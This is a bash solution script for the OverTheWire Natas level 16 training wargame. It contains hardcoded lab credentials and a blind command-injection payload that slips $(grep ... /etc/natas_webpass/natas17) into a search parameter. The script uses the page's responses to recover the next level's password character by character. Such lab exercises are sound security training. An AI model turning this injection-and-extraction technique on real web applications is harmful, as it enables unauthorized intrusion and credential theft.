#!/bin/bash

val=$1
done=false
for char in {a..z}; do
	response=$(curl -s -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo "http://natas16.natas.labs.overthewire.org/?needle=Africans%24%28grep%20-i%20%5E$val$char%20/etc/natas_webpass/natas17%29")
	if [[ "$response" != *"Africans"* ]]; then
    		response=$(curl -s -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo "http://natas16.natas.labs.overthewire.org/?needle=Africans%24%28grep%20%5E$val$char%20/etc/natas_webpass/natas17%29")
		if [[ "$response" != *"Africans"* ]]; then
			echo $char
		else
			echo "$char" | tr '[:lower:]' '[:upper:]'
		fi
		done=true
		break
	fi
done
for char in {0..9}; do
	if [[ $done == false ]]; then
		response=$(curl -s -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo "http://natas16.natas.labs.overthewire.org/?needle=Africans%24%28grep%20-i%20%5E$val$char%20/etc/natas_webpass/natas17%29")
		if [[ "$response" != *"Africans"* ]]; then
          		echo $char
                	break
		fi
        fi
done	
